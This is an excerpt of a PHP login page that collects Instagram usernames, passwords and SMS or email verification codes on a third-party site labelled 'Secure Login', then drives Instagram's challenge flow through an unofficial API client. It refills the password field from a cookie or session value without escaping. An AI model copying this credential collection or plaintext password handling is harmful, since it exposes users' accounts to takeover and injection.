...
if (isset($_POST['login'])) {
    ...
    if (!empty($username) && !empty($password)) { //SE OS INPUTS NÃO TIVEREM VAZIOS   
        ...
        //$ig->setproxy("http://149.56.96.186:80");
        ...
        try { 
            ...
            if (!empty($code)) {
                try {
                    ...
                    $customResponse = $_SESSION['custom_response'];
                    $checkApiPath = $_SESSION['checkApiPath'];
            ...
            //if ($exception instanceof ChallengeRequiredException && $response->getMessage() == 'challenge_required' || $response->getMessage() == 'checkpoint_challenge_required') {
                    ...
                    $d = $ig->getDetails($checkApiPath);
                    if (isset($d['step_data']['phone_number'])) {
                        if (!empty($d['step_data']['phone_number'])) {
                        //echo "0 - SMS";
                            $verification_method = 0;
                            $_SESSION['n_word'] = "SMS Verification code sent to you";
                            $_SESSION['n_word_input'] = "Instagram Email Verification Code";
                        }

                    } elseif (isset($d['step_data']['email'])) {
                        if (!empty($d['step_data']['email'])) {
                        //echo "1 - Email";
                            $verification_method = 1;
                            $_SESSION['n_word'] = "Email Verification code sent to you";
                            $_SESSION['n_word_input'] = "Instagram SMS Verification Code";
                        }
                    }
                ...
                //SAVE IN ARRAY
                    ...
                    $_SESSION['custom_response'] = $customResponse;
                    $_SESSION['checkApiPath'] = $checkApiPath;
    ...
    if ($login == 1) {
        ...
        $_SESSION['erro'] = "Username/Password Incorrect #3";
        echo "<script>console.log('Username/Password Incorrect #1');</script>";
    }
}
}
...
<body style="width: 100% !important; height: 100% !important;">
                    ...
                    <div style="padding: 2%; background: rgba(0, 0, 0, 0.04); margin: 2%; ">
                        ...
                        <form method="POST">
                            <div class="form-group input-group">
                                ...
                                <input type="text" name="username" class="form-control" placeholder='Instagram Username' <?php if(isset($_SESSION['member_login'])) { echo "value='".$_SESSION['member_login']."'"; } ?> <?php if(isset($_COOKIE['member_login'])) { echo "value='".$_COOKIE['member_login']."'"; } ?>>
                            </div>
                            <div class="form-group input-group">
                                <div class="input-group-prepend">
                                    <span class="input-group-text" id="basic-addon1"><i class="fas fa-key"></i></span>
                                </div>
                                <input type="password" name="password" class="form-control" placeholder="Instagram Password" <?php if(isset($_SESSION['member_password'])) { echo "value='".$_SESSION['member_password']."'"; } ?> <?php if(isset($_COOKIE['member_password'])) { echo "value='".$_COOKIE['member_password']."'"; } ?>>
                            </div>
                            <div class="form-group input-group" id="code" style="display: none;">
                                ...
                                <?php
                                if (isset($_SESSION['n_word_input'])) {
                                    $n_word_input = $_SESSION['n_word_input'];
                                } else {
                                    $n_word_input = "Instagram Email Code";
                                }
                                ?>
                                <input type="number" name="code" class="form-control" placeholder="<?php echo $n_word_input; ?>">
                            </div>
                            <div class="text-center">
    ...
    <h5 class="text-white" style="position: fixed;bottom: 50;left: 50%; transform: translateX(-50%);"><i class="fas fa-shield-alt"></i> Secure Login</h5>
    <div style="position: fixed;bottom: 0;width: 100%; border: 2px solid black; height: 50px;"></div>

    <script>
        $(document).ready(function() {
            $("#login").click(function(event) {

                $("#login").html('Connecting 5-15s <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>');
